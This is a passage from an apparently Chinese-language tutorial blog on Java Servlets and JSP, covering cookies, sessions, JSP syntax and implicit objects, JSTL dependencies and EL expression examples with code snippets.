class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>img<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/img<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://image.v0w.top/2020/12/16087061198418.jpg" alt="结果真不戳"></p><h3 id="3-7-3-实现重定向"><a href="#3-7-3-实现重定向" class="headerlink" title="3.7.3 实现重定向"></a>3.7.3 实现重定向</h3><p>常见场景：用户登录等</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sendRedirect</span><span class="params">(String var1)</span> <span class="keyword">throws</span> IOException</span>;</span><br></pre></td></tr></table></figure><h2 id="3-8-Cookie"><a href="#3-8-Cookie" class="headerlink" title="3.8 Cookie"></a>3.8 Cookie</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.v0w.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.text.DateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CookieServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        resp.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        req.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        PrintWriter pw = resp.getWriter();</span><br><span class="line">        Cookie[] cookies = req.getCookies();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Cookie cookie : cookies) &#123;</span><br><span class="line">            <span class="keyword">if</span>(cookie.getName().equals(<span class="string">&quot;time&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">long</span> time = Long.parseLong(cookie.getValue());</span><br><span class="line">                Date datetime = <span class="keyword">new</span> Date(time);</span><br><span class="line">                pw.write(datetime.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Cookie c = <span class="keyword">new</span> Cookie(<span class="string">&quot;time&quot;</span>,System.currentTimeMillis()+<span class="string">&quot;&quot;</span>);</span><br><span class="line">        resp.addCookie(c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.v0w.top/2020/12/16087171782400.jpg" alt="Cookie"></p><h2 id="3-9-Session"><a href="#3-9-Session" class="headerlink" title="3.9 Session"></a>3.9 Session</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.v0w.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SessionServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        req.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        resp.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html;charset=utf-8&quot;</span>);</span><br><span class="line">        PrintWriter pw = resp.getWriter();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//getSession</span></span><br><span class="line">        HttpSession session = req.getSession();</span><br><span class="line">        session.setAttribute(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;V0W&quot;</span>);</span><br><span class="line"></span><br><span class="line">        String SessionId = session.getId();</span><br><span class="line">        <span class="keyword">if</span>(session.isNew())&#123;</span><br><span class="line">            pw.write(<span class="string">&quot;u are new one, id is &quot;</span>+SessionId);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            pw.write(<span class="string">&quot;old one, id is &quot;</span>+SessionId);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String name = (String) session.getAttribute(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        pw.write(<span class="string">&quot;name: &quot;</span>+name);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Session做了什么事情：</span></span><br><span class="line"><span class="comment">        * Cookie jsessionid = new Cookie(&quot;JSESSIONID&quot;, SessionId);</span></span><br><span class="line"><span class="comment">        * resp.addCookie(jsessionid)</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.v0w.top/2020/12/16087162567456.jpg" alt="JSESSIONID"></p><p>Session失效：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">session.invalidate();</span><br></pre></td></tr></table></figure><p>可以在web程序的web.xml中设置session时间等配置，也可以在Tomcat等容器的web.xml中设置session时间。</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- session-config包含一个子元素session-timeout.定义web站台中的session参数.  --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">session-config</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 定义这个web站台所有session的有效期限.单位为分钟. 例子中为600分钟 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">session-timeout</span>&gt;</span>600<span class="tag">&lt;/<span class="name">session-timeout</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">session-config</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>优先级：Servlet中API设置 &gt; 程序/web.xml设置 &gt; Tomcat/conf/web.xml设置</strong></p><h1 id="0x04-JSP"><a href="#0x04-JSP" class="headerlink" title="0x04 JSP"></a>0x04 JSP</h1><h2 id="4-1-JSP原理"><a href="#4-1-JSP原理" class="headerlink" title="4.1 JSP原理"></a>4.1 JSP原理</h2><p>Java Server Page: 可以嵌入Java代码，实现动态功能。</p><p>服务器会把jsp编译成java代码和class, jsp本质上就是servlet。<br><img src="https://image.v0w.top/2020/12/16087856535381.jpg"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">_jspInit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="comment">// 销毁</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">_jspDestroy</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"><span class="comment">// jspService</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">_jspService</span><span class="params">(<span class="keyword">final</span> javax.servlet.http.HttpServletRequest request, <span class="keyword">final</span> javax.servlet.http.HttpServletResponse response)</span></span></span><br></pre></td></tr></table></figure><ol><li><p>判断请求类型</p></li><li><p>内置一些对象</p> <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> javax.servlet.jsp.PageContext pageContext;<span class="comment">//页面上下文</span></span><br><span class="line"><span class="keyword">final</span> javax.servlet.ServletContext application;<span class="comment">//applicationContext</span></span><br><span class="line"><span class="keyword">final</span> javax.servlet.ServletConfig config;<span class="comment">//config</span></span><br><span class="line">javax.servlet.jsp.JspWriter out = <span class="keyword">null</span>;<span class="comment">//out</span></span><br><span class="line"><span class="keyword">final</span> java.lang.Object page = <span class="keyword">this</span>;<span class="comment">//page this</span></span><br><span class="line">javax.servlet.jsp.JspWriter _jspx_out = <span class="keyword">null</span>;<span class="comment">//out</span></span><br><span class="line">javax.servlet.jsp.PageContext _jspx_page_context = <span class="keyword">null</span>;<span class="comment">//页面上下文</span></span><br></pre></td></tr></table></figure></li><li><p>输出页面增加的代码</p> <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">      response.setContentType(<span class="string">&quot;text/html; charset=UTF-8&quot;</span>);</span><br><span class="line">      pageContext = _jspxFactory.getPageContext(<span class="keyword">this</span>, request, response,</span><br><span class="line">      <span class="keyword">null</span>, <span class="keyword">false</span>, <span class="number">8192</span>, <span class="keyword">true</span>);</span><br><span class="line">      _jspx_page_context = pageContext;</span><br><span class="line">      application = pageContext.getServletContext();</span><br><span class="line">      config = pageContext.getServletConfig();</span><br><span class="line">      out = pageContext.getOut();</span><br><span class="line">      _jspx_out = out;</span><br></pre></td></tr></table></figure></li><li><p>以上对象可以在JSP直接使用</p></li></ol><p><img src="https://image.v0w.top/2020/12/16087880765117.jpg" alt="jsp流程图"></p><h2 id="4-2-JSP语法"><a href="#4-2-JSP语法" class="headerlink" title="4.2 JSP语法"></a>4.2 JSP语法</h2><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%--jsp表达式：</span><br><span class="line">&lt;%= 变量或者表达式%&gt;</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%= <span class="keyword">new</span> java.util.Date()%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%-- &lt;% Java代码 %&gt; --%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">50</span>; i++) &#123;</span><br><span class="line">        sum+=i;</span><br><span class="line">    &#125;</span><br><span class="line">    out.write(<span class="string">&quot;&lt;h1&gt;&quot;</span>+sum+<span class="string">&quot;&lt;/h1&gt;&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>jsp声明</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> globalVar = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Loading&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>jsp声明生成java代码放到<code>index_jsp.java</code>类里面，jsp表达式等生成java代码放到<code>_jspService</code>方法中。</p><h2 id="4-3-JSP指令"><a href="#4-3-JSP指令" class="headerlink" title="4.3 JSP指令"></a>4.3 JSP指令</h2><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> errorPage=<span class="string">&quot;error.jsp&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br></pre></td></tr></table></figure><h2 id="4-4-九大内置对象"><a href="#4-4-九大内置对象" class="headerlink" title="4.4 九大内置对象"></a>4.4 九大内置对象</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. PageContext</span><br><span class="line">2. Request</span><br><span class="line">3. Response</span><br><span class="line">4. Session</span><br><span class="line">5. Application（ServletContext）</span><br><span class="line">6. config (ServletConfig)</span><br><span class="line">7. out</span><br><span class="line">8. page</span><br><span class="line">9. exception</span><br></pre></td></tr></table></figure><p>举例</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    pageContext.setAttribute(<span class="string">&quot;name1&quot;</span>,<span class="string">&quot;V0W1&quot;</span>);</span><br><span class="line">    request.setAttribute(<span class="string">&quot;name2&quot;</span>,<span class="string">&quot;v0w2&quot;</span>);</span><br><span class="line">    session.setAttribute(<span class="string">&quot;name3&quot;</span>,<span class="string">&quot;V0W3&quot;</span>);</span><br><span class="line">    application.setAttribute(<span class="string">&quot;name4&quot;</span>,<span class="string">&quot;V0W4&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    String name1 = (String) pageContext.findAttribute(<span class="string">&quot;name1&quot;</span>);</span><br><span class="line">    String name2 = (String) pageContext.findAttribute(<span class="string">&quot;name2&quot;</span>);</span><br><span class="line">    String name3 = (String) pageContext.findAttribute(<span class="string">&quot;name3&quot;</span>);</span><br><span class="line">    String name4 = (String) pageContext.findAttribute(<span class="string">&quot;name4&quot;</span>);</span><br><span class="line">    String name5 = (String) pageContext.findAttribute(<span class="string">&quot;name5&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%--使用EL表达式来取最快 $&#123;&#125; 且对于不存在的变量，不会显示--%&gt;</span><br><span class="line">&lt;h2&gt;取出的值为&lt;/h2&gt;</span><br><span class="line">&lt;h3&gt;$&#123;name1&#125;&lt;/h3&gt;</span><br><span class="line">&lt;h3&gt;$&#123;name2&#125;&lt;/h3&gt;</span><br><span class="line">&lt;h3&gt;$&#123;name3&#125;&lt;/h3&gt;</span><br><span class="line">&lt;h3&gt;$&#123;name4&#125;&lt;/h3&gt;</span><br><span class="line">&lt;h3&gt;$&#123;name5&#125;&lt;/h3&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="4-5-jsp标签-amp-JSTL表达式-amp-EL表达式"><a href="#4-5-jsp标签-amp-JSTL表达式-amp-EL表达式" class="headerlink" title="4.5 jsp标签&amp;JSTL表达式&amp;EL表达式"></a>4.5 jsp标签&amp;JSTL表达式&amp;EL表达式</h2><p>依赖</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/javax.servlet.jsp/javax.servlet.jsp-api --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet.jsp-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/javax.servlet.jsp.jstl/jstl --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp.jstl<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/taglibs/standard --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>taglibs<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>standard<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="jsp标签"><a href="#jsp标签" class="headerlink" title="jsp标签"></a>jsp标签</h3><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%--包含文件--%&gt;</span><br><span class="line">&lt;jsp:include page=&quot;index.jsp&quot;&gt;&lt;/jsp:include&gt;</span><br><span class="line"></span><br><span class="line">&lt;jsp:forward page=<span class="string">&quot;index.jsp&quot;</span>&gt;</span><br><span class="line">    &lt;jsp:param name=<span class="string">&quot;name&quot;</span> value=<span class="string">&quot;V0W&quot;</span>/&gt;</span><br><span class="line">    &lt;jsp:param name=<span class="string">&quot;age&quot;</span> value=<span class="string">&quot;12&quot;</span>/&gt;</span><br><span class="line">&lt;/jsp:forward&gt;</span><br><span class="line">&lt;%--相当于index.jsp?name=V0W&amp;age=<span class="number">12</span>--%&gt;</span><br></pre></td></tr></table></figure><h3 id="JSTL标签"><a href="#JSTL标签" class="headerlink" title="JSTL标签"></a>JSTL标签</h3><p>JSTL标签库的使用就是为了弥补jsp标签的不足。<br>需要依赖一些jar包：<br>1：jstl-1.2<br>2：standard-1.1.2<br>3：jstl-api-1.2.1<br>4：jstl-impl-1.2</p><p>pom.xml</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/javax.servlet.jsp.jstl/jstl --&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp.jstl<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">&lt;!-- https://mvnrepository.com/artifact/taglibs/standard --&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>taglibs<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>standard<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">&lt;!-- https://mvnrepository.com/artifact/javax.servlet.jsp.jstl/jstl-api --&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp.jstl<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.glassfish.web/jstl-impl --&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.glassfish.web<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl-impl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>引入JSTL标签</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%--核心标签是最常用的 JSTL标签。引用核心标签库的语法如下：--%&gt;</span><br><span class="line">&lt;%@ taglib prefix&#x3D;&quot;c&quot; uri&#x3D;&quot;http:&#x2F;&#x2F;java.sun.com&#x2F;jsp&#x2F;jstl&#x2F;core&quot; %&gt;</span><br></pre></td></tr></table></figure><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%--核心标签是最常用的 JSTL标签。引用核心标签库的语法如下：--%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;c&quot;</span> uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/core&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;JSTL&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;JSTL.jsp&quot;</span> method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">    &lt;%--</span><br><span class="line">    EL 表达式获取表单的数据</span><br><span class="line">    $&#123;param.username&#125;</span><br><span class="line">    --%&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> value=<span class="string">&quot;$&#123;param.username&#125;&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;%--判断提交的用户名是admin，就登录成功--%&gt;</span><br><span class="line">&lt;c:<span class="keyword">if</span> test=<span class="string">&quot;$&#123;param.username==&#x27;admin&#x27;&#125;&quot;</span> <span class="keyword">var</span>=<span class="string">&quot;isAdmin&quot;</span>&gt;</span><br><span class="line">    &lt;c:out value=<span class="string">&quot;管理员欢迎你&quot;</span> /&gt;</span><br><span class="line">&lt;/c:if&gt;</span><br><span class="line"></span><br><span class="line">&lt;c:out value=<span class="string">&quot;$&#123;isAdmin&#125;&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.v0w.top/2020/12/16091261714129.jpg" alt="效果图"><br>其他标签需要的时候，参考<a href="https://www.runoob.com/jsp/jsp-jstl.html">菜鸟教程-jsp-jstl标签</a>即可</p><h3 id="EL表达式"><a href="#EL表达式" class="headerlink" title="EL表达式"></a>EL表达式</h3><p>不同版本的tomcat是否默认开启对EL表达式的支持，是不一定的。<br>所以为了保证EL表达式能够正常使用，需要在<code>&lt;%@page</code>标签里加上<code>isELIgnored=&quot;false&quot;</code><br>使用EL表达式，非常简单。</p><p><strong>输出</strong><br>比如使用JSTL输出要写成</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;c:out value&#x3D;&quot;$&#123;name&#125;&quot; &#x2F;&gt; </span><br></pre></td></tr></table></figure><p>但是用EL只需要</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;name&#125;</span><br></pre></td></tr></table></figure><p>EL表达式可以从<code>pageContext,request,session,application</code>四个作用域中取到值，如果4个作用域都有name属性怎么办？<br>EL会按照从高到低的优先级顺序获取<br><code>pageContext&gt;request&gt;session&gt;application</code></p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span></span><br><span class="line">    pageEncoding=<span class="string">&quot;UTF-8&quot;</span> isELIgnored=<span class="string">&quot;false&quot;</span>%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%@ taglib uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/core&quot;</span> prefix=<span class="string">&quot;c&quot;</span>%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;c:set <span class="keyword">var</span>=<span class="string">&quot;name&quot;</span> value=<span class="string">&quot;$&#123;&#x27;gareen-pageContext&#x27;&#125;&quot;</span> scope=<span class="string">&quot;page&quot;</span> /&gt;</span><br><span class="line">&lt;c:set <span class="keyword">var</span>=<span class="string">&quot;name&quot;</span> value=<span class="string">&quot;$&#123;&#x27;gareen-request&#x27;&#125;&quot;</span> scope=<span class="string">&quot;request&quot;</span> /&gt;</span><br><span class="line">&lt;c:set <span class="keyword">var</span>=<span class="string">&quot;name&quot;</span> value=<span class="string">&quot;$&#123;&#x27;gareen-session&#x27;&#125;&quot;</span> scope=<span class="string">&quot;session&quot;</span> /&gt;</span><br><span class="line">&lt;c:set <span class="keyword">var</span>=<span class="string">&quot;name&quot;</span> value=<span class="string">&quot;$&#123;&#x27;gareen-application&#x27;&#125;&quot;</span> scope=<span class="string">&quot;application&quot;</span> /&gt;</span><br><span class="line"> </span><br><span class="line"><span class="number">4</span>个作用域都有name,优先获取出来的是 ： $&#123;name&#125;</span><br></pre></td></tr></table></figure><p>结合JSTL标签<code>&lt;c:forEach&gt;</code>使用，可以进一步简化代码：</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span></span><br><span class="line">    pageEncoding=<span class="string">&quot;UTF-8&quot;</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*&quot;</span>%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%@ taglib uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/core&quot;</span> prefix=<span class="string">&quot;c&quot;</span>%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line">    List&lt;String&gt; heros = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">    heros.add(<span class="string">&quot;塔姆&quot;</span>);</span><br><span class="line">    heros.add(<span class="string">&quot;艾克&quot;</span>);</span><br><span class="line">    heros.add(<span class="string">&quot;巴德&quot;</span>);</span><br><span class="line">    heros.add(<span class="string">&quot;雷克赛&quot;</span>);</span><br><span class="line">    heros.add(<span class="string">&quot;卡莉丝塔&quot;</span>);</span><br><span class="line">    request.setAttribute(<span class="string">&quot;heros&quot;</span>,heros);</span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;table width=<span class="string">&quot;200px&quot;</span> align=<span class="string">&quot;center&quot;</span> border=<span class="string">&quot;1&quot;</span> cellspacing=<span class="string">&quot;0&quot;</span>&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">    &lt;td&gt;编号&lt;/td&gt;</span><br><span class="line">    &lt;td&gt;英雄&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">   </span><br><span class="line">&lt;c:forEach items=<span class="string">&quot;$&#123;heros&#125;&quot;</span> <span class="keyword">var</span>=<span class="string">&quot;hero&quot;</span> varStatus=<span class="string">&quot;st&quot;</span>  &gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;$&#123;st.count&#125;&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;$&#123;hero&#125;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;/c:forEach&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>取参数</strong></p><figure class="highlight jsp"><table><tr><td 